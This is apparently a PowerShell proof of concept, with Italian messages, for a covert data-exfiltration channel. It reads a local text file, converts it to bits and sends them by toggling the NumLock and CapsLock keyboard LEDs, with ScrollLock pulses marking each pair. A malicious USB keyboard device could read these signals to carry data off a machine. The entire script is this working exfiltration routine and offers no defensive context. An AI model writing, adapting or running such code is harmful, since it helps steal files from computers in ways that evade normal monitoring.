$content = Get-Content -Path "C:\Users\Public\test.txt"
$byteArray = @()

foreach ($byte in [System.Text.Encoding]::Default.GetBytes($content)) {
    $byteString = [System.Convert]::ToString($byte, 2).PadLeft(8, '0')
    $byteArray += $byteString
    }
Write-Host "Stringa completa: $byteArray"

foreach ($element in $byteArray) {
    Write-Host "Elemento: $element"
    for ($i=0; $i -lt $element.Length; $i+=2) {

        $bit1 = $element[$i]
        $bit2 = $element[$i+1]

        # def led 1
        if ([System.Windows.Forms.Control]::IsKeyLocked('NumLock') -eq $false) { $led1 = 0 }
        else { $led1 = 1 }
        # def led 2
        if ([System.Windows.Forms.Control]::IsKeyLocked('CapsLock') -eq $false) { $led2 = 0 }
        else { $led2 = 1 }
        Write-Host "LED1: $led1, LED2: $led2"
        Write-Host "Sequenza: $bit1$bit2"

        if ($led1 -eq '0' -and $bit1 -eq '1') {
            Write-Host "LED1 spento e BIT1=1: accendo il led"
            (New-Object -ComObject WScript.Shell).SendKeys('{NUMLOCK}')
            }
        if ($led1 -eq '1' -and $bit1 -eq '0') {
            Write-Host "LED1 acceso e BIT1=0: spengo il led"
            (New-Object -ComObject WScript.Shell).SendKeys('{NUMLOCK}')
            }
        if ($led2 -eq '0' -and $bit2 -eq '1') {
            Write-Host "LED2 spento e BIT2=1: accendo il led"
            (New-Object -ComObject WScript.Shell).SendKeys('{CAPSLOCK}')
            }

        if ($led2 -eq '1' -and $bit2 -eq '0') {
            Write-Host "LED2 acceso e BIT2=0: spengo il led"
            (New-Object -ComObject WScript.Shell).SendKeys('{CAPSLOCK}')
            }
        (New-Object -ComObject WScript.Shell).SendKeys('{SCROLLLOCK}') # fine sequenza
        Start-Sleep -Milliseconds 5
        (New-Object -ComObject WScript.Shell).SendKeys('{SCROLLLOCK}') # reset
        Start-Sleep -Milliseconds 5
        }
    }
    
$payload = $element.Length * 8
Write-Host "##################################################"
Write-Host "# Payload: $payload"